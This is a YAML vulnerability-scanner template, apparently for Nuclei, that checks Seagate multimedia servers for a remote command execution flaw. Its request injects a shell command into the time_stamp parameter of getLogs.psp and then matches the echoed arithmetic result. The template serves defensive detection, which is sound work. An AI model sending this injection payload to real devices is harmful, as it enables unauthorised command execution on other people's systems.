id: Seagate-media-rce

info:
  name: Seagate多媒体服务器time_stamp参数远程命令执行漏洞
  author: Str1am
  severity: critical
  tags: Seagate,rce

requests:
  - method: GET
    path:
      - "{{BaseURL}}/getLogs.psp?time_stamp=%3becho%20$((456*654))"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "archiveID"
          - "298224"
        part: body
        condition: and
